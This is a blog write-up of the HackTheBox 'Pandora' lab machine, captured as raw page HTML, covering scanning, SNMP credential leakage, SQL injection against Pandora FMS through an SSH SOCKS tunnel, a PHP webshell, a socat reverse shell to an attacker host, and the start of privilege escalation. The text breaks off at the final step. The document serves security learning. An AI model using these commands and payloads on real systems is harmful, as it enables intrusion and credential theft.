@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox - Pandora | ConnorsEH</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox - Pandora" /><meta name="author" content="Connor" /><meta property="og:locale" content="en_US" /><meta name="description" content="Pandora Probably the hardest “easy” box i have done yet. Pandora makes use of a dynamic tunnel via SSH, which creates a proxy to view the hosted webpage. Pandora let me explore new tools, such as proxychains, allowing me to tunnel commands via proxy, and snmpwalk for enumerating snmp. Recon ``` ┌──(root💀NTAKali)-[~/Desktop] └─# nmap 10.10.11.136 -sV -sC -Pn -T 5 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 15:35 GMT Warning: 10.10.11.136 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.11.136 Host is up (0.073s latency). Not shown: 919 closed tcp ports (reset), 79 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><meta property="og:description" content="Pandora Probably the hardest “easy” box i have done yet. Pandora makes use of a dynamic tunnel via SSH, which creates a proxy to view the hosted webpage. Pandora let me explore new tools, such as proxychains, allowing me to tunnel commands via proxy, and snmpwalk for enumerating snmp. Recon ``` ┌──(root💀NTAKali)-[~/Desktop] └─# nmap 10.10.11.136 -sV -sC -Pn -T 5 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 15:35 GMT Warning: 10.10.11.136 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.11.136 Host is up (0.073s latency). Not shown: 919 closed tcp ports (reset), 79 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><link rel="canonical" href="https://connorseh.com/posts/Pandora/" /><meta property="og:url" content="https://connorseh.com/posts/Pandora/" /><meta property="og:site_name" content="ConnorsEH" /><meta property="og:image" content="https://connorseh.com/assets/img/Icons/Pandora/pandora.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-02T13:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://connorseh.com/assets/img/Icons/Pandora/pandora.png" /><meta property="twitter:title" content="HackTheBox - Pandora" /><meta name="twitter:site" content="@C_Weeks_Pearson" /><meta name="twitter:creator" content="@Connor" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"headline":"HackTheBox - Pandora","dateModified":"2022-06-02T13:00:00+01:00","description":"Pandora Probably the hardest “easy” box i have done yet. Pandora makes use of a dynamic tunnel via SSH, which creates a proxy to view the hosted webpage. Pandora let me explore new tools, such as proxychains, allowing me to tunnel commands via proxy, and snmpwalk for enumerating snmp. Recon ``` ┌──(root💀NTAKali)-[~/Desktop] └─# nmap 10.10.11.136 -sV -sC -Pn -T 5 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 15:35 GMT Warning: 10.10.11.136 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.11.136 Host is up (0.073s latency). Not shown: 919 closed tcp ports (reset), 79 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel","datePublished":"2022-06-02T13:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://connorseh.com/posts/Pandora/"},"image":"https://connorseh.com/assets/img/Icons/Pandora/pandora.png","url":"https://connorseh.com/posts/Pandora/","author":{"@type":"Person","name":"Connor"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex align-self-center"> <a href="/" alt="avatar"> <img src="/assets/img/logo/CEH-new.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">ConnorsEH</a></div><div class="site-subtitle font-italic">Graduate | HTC Newbie | CTF Player</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/ConnorDWP" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/C_Weeks_Pearson" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['ConnorDWP',''].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox - Pandora</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Pandora</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Jun 2, 2022, 1:00 PM +0100" > Jun 2 <i class="unloaded">2022-06-02T13:00:00+01:00</i> </span> by <span class="author"> Connor </span></div></div><div class="post-content"> <img src="/assets/img/Icons/Pandora/pandora.png" class="post-preview-img"><h1 id="pandora">Pandora</h1><hr /><p>Probably the hardest “easy” box i have done yet. Pandora makes use of a dynamic tunnel via SSH, which creates a proxy to view the hosted webpage. Pandora let me explore new tools, such as <code class="language-plaintext highlighter-rouge">proxychains</code>, allowing me to tunnel commands via proxy, and <code class="language-plaintext highlighter-rouge">snmpwalk</code> for enumerating snmp.</p><h2 id="recon">Recon</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>┌──(root💀NTAKali)-[~/Desktop]
+└─# nmap 10.10.11.136 -sV -sC -Pn -T 5
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 15:35 GMT
+Warning: 10.10.11.136 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.136
+Host is up (0.073s latency).
+Not shown: 919 closed tcp ports (reset), 79 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
+|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
+|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Play | Landing
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 62.16 seconds
+</pre></table></code></div></div><p>Port 80 is hosting a website called “Play”, an extension of <code class="language-plaintext highlighter-rouge">panda.htb</code>. Lets add this to our hosts file <code class="language-plaintext highlighter-rouge">echo 10.10.11.136 panda.htb &gt;&gt; /etc/hosts</code></p><p>After looking through the website, i decided to see if the contact form had any vulnerabilities, but i seemed to hit a dead end so decided to search elsewhere.</p><h3 id="udp">UDP</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre>┌──(root💀NTAKali)-[~/Desktop]
+└─# nmap -sU --top-ports=20 10.10.11.136
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-09 10:18 GMT
+Nmap scan report for panda.htb (10.10.11.136)
+Host is up (0.15s latency).
+
+PORT      STATE  SERVICE
+53/udp    closed domain
+67/udp    closed dhcps
+68/udp    closed dhcpc
+69/udp    closed tftp
+123/udp   closed ntp
+135/udp   closed msrpc
+137/udp   closed netbios-ns
+138/udp   closed netbios-dgm
+139/udp   closed netbios-ssn
+161/udp   open   snmp
+162/udp   closed snmptrap
+445/udp   closed microsoft-ds
+500/udp   closed isakmp
+514/udp   closed syslog
+520/udp   closed route
+631/udp   closed ipp
+1434/udp  closed ms-sql-m
+1900/udp  closed upnp
+4500/udp  closed nat-t-ike
+49152/udp closed unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 15.58 seconds
+</pre></table></code></div></div><p>With no success with the site on port 80, i decided to also do a UDP scan of the top 20 UDP ports. The scan showed port 161 open with snmp. Lets try and enumerate this further with <code class="language-plaintext highlighter-rouge">nmap -sU -p 161 -sV -sC</code></p><pre><code class="language-┌──(root💀NTAKali)-[~/Desktop]">└─# nmap -sU -sV -sC -p 161 10.10.11.136
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-09 10:22 GMT
+Nmap scan report for panda.htb (10.10.11.136)
+Host is up (0.086s latency).
+
+Bug in snmp-win32-software: no string output.
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: 48fa95537765c36000000000
+|   snmpEngineBoots: 30
+|_  snmpEngineTime: 1d21h25m23s
+| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
+|_  System uptime: 1d21h25m24.02s (16352402 timeticks)
+| snmp-netstat: 
+|   TCP  0.0.0.0:22           0.0.0.0:0
+|   TCP  10.10.11.136:38132   1.1.1.1:53
+|   TCP  10.10.11.136:50496   10.10.14.8:1234
+|   TCP  127.0.0.1:3306       0.0.0.0:0
+|   TCP  127.0.0.53:53        0.0.0.0:0
+|   UDP  0.0.0.0:161          *:*
+|_  UDP  127.0.0.53:53        *:*
+| snmp-processes: 
+|   1: 
+|   2: 
+|   3: 
+|   4: 
+|   6: 
+|   9: 
+|   10: 
+|   11: 
+|   12: 
+|   13: 
+|   14: 
+|   15: 
+|   16: 
+|   17: 
+|   18: 
+|   20: 
+|   21: 
+|   22: 
+|   23: 
+|   24: 
+|   25: 
+|   26: 
+|   27: 
+|   28: 
+|_  29: 
+Service Info: Host: pandora
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
+</code></pre><p>The host is running SNMPv1, which is the oldest and original version of the SNMP protocol. SNMPv1’s biggest flaw is its <strong>use of a clear-text community string</strong>, which can be used to enumerate devices and information that otherwise should be encyrpted.</p><p>From the nmap scan, we can also see the community string <code class="language-plaintext highlighter-rouge">public</code>, and so we can use this to enumerate further, using snmpwalk.</p><h3 id="snmp">SNMP</h3><p>We can use the following command to enumerate SNMP <code class="language-plaintext highlighter-rouge">snmpwalk -c public -v1 &lt;IP&gt;</code></p><p>Where <code class="language-plaintext highlighter-rouge">-c</code> sets the community string, in this case <code class="language-plaintext highlighter-rouge">public</code>, and <code class="language-plaintext highlighter-rouge">-v1</code> sets the version to SNMPv1.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>iso.3.6.1.2.1.25.4.2.1.5.873 = ""
+iso.3.6.1.2.1.25.4.2.1.5.934 = STRING: "-o -p -- \\u --noclear tty1 linux"
+iso.3.6.1.2.1.25.4.2.1.5.954 = ""
+iso.3.6.1.2.1.25.4.2.1.5.971 = STRING: "-k start"
+iso.3.6.1.2.1.25.4.2.1.5.1098 = STRING: "-u daniel -p HotelBabylon23"
+iso.3.6.1.2.1.25.4.2.1.5.27536 = ""
+iso.3.6.1.2.1.25.4.2.1.5.33650 = STRING: "-k start"
+iso.3.6.1.2.1.25.4.2.1.5.33652 = STRING: "-k start"
+iso.3.6.1.2.1.25.4.2.1.5.34191 = STRING: "-k start"
+iso.3.6.1.2.1.25.4.2.1.5.34210 = STRING: "-k start"
+
+</pre></table></code></div></div><p>Near the bottom of the results, we can see what looks like credentials for user <code class="language-plaintext highlighter-rouge">daniel</code>, with the password <code class="language-plaintext highlighter-rouge">HotelBabylon23</code>.</p><p>We can use these to log into the system with SSH, as port 22 is open.</p><h2 id="foothold">Foothold</h2><p>Once SSH’d in daniels account, i looked for the <code class="language-plaintext highlighter-rouge">user.txt</code> flag, which is in the /matt directory. When attempting to access it, i am denied. Thus i must attempt to pivot into user matt.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>daniel@pandora:/home/matt$ cat user.txt
+cat: user.txt: Permission denied
+</pre></table></code></div></div><h3 id="pivoting">Pivoting</h3><p>Looking in the /var/www directory, i can see two directories, <code class="language-plaintext highlighter-rouge">html</code> and <code class="language-plaintext highlighter-rouge">pandora</code>. html is visible and accessible from a public host, but pandora is not. If i look at the /etc/hosts file on the system, we can see they have it setup this way:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>daniel@pandora:~$ cat /etc/hosts
+127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
+127.0.1.1 pandora
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</pre></table></code></div></div><p>Assuming localhost.localdomain will allow access into the pandora directory, we can setup a dynamic tunnel using SSH. <code class="language-plaintext highlighter-rouge">ssh -D 9999 daniel@panda.htb</code></p><p>When can then setup a proxy using FoxyProxy, using SOCKS5, which supports DNS resolution, to resolve the webpage on localhost.localdomain. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Icons/Pandora/foxyproxy.png" alt="foxyproxy" /></p><p>From here we are greeted with the following Pandora FMS webpage:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Icons/Pandora/fms.png" alt="FMS" /></p><p>Attempting to login with daniels credentials results in an error message saying only <code class="language-plaintext highlighter-rouge">"User can only access API."</code> From here i started to do some googling, which lead me to this website:</p><blockquote><p>https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</p></blockquote><p>This website details different vulnerabilities with Pandora FMS, but what stood out to me was the unauthenticaed SQL injection associated with <code class="language-plaintext highlighter-rouge">**chart_generator.php**</code> and <code class="language-plaintext highlighter-rouge">session_id</code>. I checked whether the chart_generator_php was there, and it was, but the error message “ACCESS IS NOT GRANTED” appeared.</p><h3 id="proxychains">ProxyChains</h3><p>Knowing that i can access the vulnerable page, i will using sqlmap via proxychains. ProxyChains is a tool that forces any TCP connection made by any given application to go through proxies. Essentially, you can use ProxyChains to run any program through a proxy server.</p><p>First thing is to add the proxy we created to the proxy chains config. <code class="language-plaintext highlighter-rouge">socks5 127.0.0.1 9999 daniel HotelBabylon23</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>pico /etc/proxychains4.conf
+
+[ProxyList]
+# add proxy here ...
+# meanwhile
+# defaults set to "tor"
+#socks4    127.0.0.1 9050
+socks5 127.0.0.1 9999 daniel HotelBabylon23
+</pre></table></code></div></div><p>I can now use sqlmap with proxychains on the Pandora FMS.</p><p><code class="language-plaintext highlighter-rouge">proxychains sqlmap -u http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id= --dbs</code></p><pre>
+[21:21:12] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
+web application technology: PHP, Apache 2.4.41
+back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
+[21:21:12] [INFO] fetching database names
+[proxychains] Strict chain  ...  127.0.0.1:9999  ...  localhost.localdomain:80  ...  OK
+[21:21:12] [WARNING] reflective value(s) found and filtering out
+[proxychains] Strict chain  ...  127.0.0.1:9999  ...  localhost.localdomain:80  ...  OK
+[21:21:13] [INFO] retrieved: 'information_schema'
+[proxychains] Strict chain  ...  127.0.0.1:9999  ...  localhost.localdomain:80  ...  OK
+[21:21:13] [INFO] retrieved: 'pandora'
+available databases [2]:
+[*] information_schema
+[*] pandora
+</pre><p>After enumering through the pandora database, i found 2 interesting tables, <code class="language-plaintext highlighter-rouge">tpassword_history</code> and <code class="language-plaintext highlighter-rouge">tsessions_php</code>.</p><p>Dumping the password history table gave me the md5 hashed passwords of Matt and Daniel. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Icons/Pandora/passdump.png" alt="" /></p><p>Dumping the sessions_php table gave me session id’s for both matt and daniel.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Icons/Pandora/sessid.png" alt="" /></p><p>Awesome, now i can use Matts session_id cookie and login to his account.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Icons/Pandora/mattaccount.png" alt="" /></p><p>Unfortunately, Matt is not an admin. However, using the following SQL injection line from <code class="language-plaintext highlighter-rouge">sqlpwn.py</code> gave me the admin cookie, to elevate to admin.</p><blockquote><p>https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py</p></blockquote><pre><code class="language-http:///pandora_console/include/chart_generator.php">
+### Webshell
+Now i am able to upload files via the admin file manager.
+![](/assets/img/Icons/Pandora/fileupload.png)
+
+After trying to upload a php reverse shell and getting no luck, i decided to upload a php webshell.
+
+![](/assets/img/Icons/Pandora/phpwebshell.png)
+
+From here, i attempted to get a reverse shell with socat, which allows full TTY over shells. 
+###### Host
+`socat file:tty,raw,echo=0 tcp-listen:4445`
+######  Web Shell
+`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;IP&gt;:&lt;PORT&gt;`
+
+We have a reverse shell, nice!
+
+## User
+Moving to the matt directory, i can now access the user flag.
+&lt;pre&gt;
+matt@pandora:/home/matt$ cat user.txt 
+*30***b8557f5**be1160c*4be67c***
+&lt;/pre&gt;
+
+## Priviledge Esculation
+After some looking around, i noticed that i was in some sort of restricted environment. When typing `sudo`, i was presented with the following weird error message.
+&lt;pre&gt;
+matt@pandora:/home/matt$ sudo
+sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
+sudo: unable to initialize policy plugin
+&lt;/pre&gt;
+
+From here, i looked for SUID binaries.
+`find / -perm -u=s -type f 2&gt;/dev/null`
+
+&lt;pre&gt;
+matt@pandora:/home/matt$ find / -perm -u=s -type f 2&gt;/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/pandora_backup
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+&lt;/pre&gt;
+
+I checked some binaries on GTFObins, and found a possible shell escape using the `/usr/bin/at` binary.
+
+</code></pre><p>echo “/bin/sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)” | at now; tail -f /dev/null</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>
+Now when typing sudo, i am met with the normal functionality.
+
+Another insteresting binary was  `pandora_backup`. I downloaded it to my host machine, and run `strings` to see if there is any useful information i can see.
+
+```bash
+PandoraFMS Backup Utility
+Now attempting to backup PandoraFMS client
+tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
+Backup failed!
+Check your permissions!
+</pre></table></code></div></div><p>It looks as though the tar command it used to compress files in the root directory. However i noticed the call to tar does not use the full path, and so i can change to $PATH to a custom tar executable, possibly allowing for priviledge esculation.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
